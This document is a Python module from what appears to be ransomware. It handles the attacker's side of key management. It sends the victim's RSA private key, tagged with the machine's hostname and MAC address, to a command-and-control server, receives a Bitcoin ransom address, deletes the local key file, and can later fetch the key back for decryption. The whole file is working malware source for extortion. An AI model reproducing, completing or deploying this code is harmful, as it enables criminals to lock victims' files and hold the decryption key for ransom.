import requests
import os
import gc
import socket
import json
import uuid
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from Session_Handling import read_session_token
from Variables import c2_server, rsa_key, api_key, wrong_api_key

####################################################################################################################

def send_private_key_to_c2(private_key):
    # Serialize private key so it can be sent as bytes
    private_key_bytes = private_key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption()
    )

    # Rename of the private key
    unique_id = get_machine_identifier()
    renamed_key = f"{unique_id}_private.pem"
    session_token = read_session_token()
    if session_token:
        headers = {
        'API-KEY': api_key,
        'Session-Token' : session_token
        }
    else:
        print("No session token") # Debug Message

    try:
        # Sending the private key to c2 server
        files = {"key": (renamed_key, private_key_bytes)}
        response = requests.post(c2_server + "/upload_key", files=files, headers=headers)
        
        if response.status_code == 200:
            data = response.json()
            btc_address = data.get('btc_address', None)
            if btc_address:
                print(f"BTC Address received: {btc_address}")  # Debug Message
                with open("response_data.json", "w") as json_file: # Dumping the response into a json file so i can use it later
                    json.dump(data, json_file, indent=4)
            else:
                print("BTC address not found in the response.")

            print(f"Sent private key: {renamed_key}")  # Debug Message

            # Delete private key from memory and system
            private_key = None
            gc.collect()
            if os.path.exists(rsa_key):
                os.remove(rsa_key)
                print(f"Deleted private key file: {rsa_key}") # Debug Message

        else:
            print(f"Error send key status code: {response.status_code}") # Debug Message

    except Exception as e:
        print(f"Error sending key: {e}") # Debug Message

####################################################################################################################

def get_machine_identifier():
    hostname = socket.gethostname()
    mac = uuid.getnode()
    unique_id = f"{hostname}_{mac}"
    return unique_id

####################################################################################################################

def fetch_and_load_private_key():
    unique_id = get_machine_identifier()
    renamed_key = f"{unique_id}_private.pem"
    session_token = read_session_token()
    if session_token:
        headers = {
        'API-KEY': api_key,
        'Session-Token' : session_token
        }
    else:
        print("No session token") # Debug Message

    url = f"{c2_server}/get_key/{renamed_key}"
    try:
        resp = requests.get(url, headers=headers)
        resp.raise_for_status()
        print("Success fetching key") # Debug Message
    except requests.RequestException as e:
        print(f"Error fetch key: {e}") # Debug Message
        return None

    pem_bytes = resp.content

    try:
        private_key = serialization.load_pem_private_key(
            pem_bytes,
            password=None,
            backend=default_backend()
        )
        return private_key
    except Exception as e:
        print(f"Invalid key: {e}") # Debug Message
        return None
    
####################################################################################################################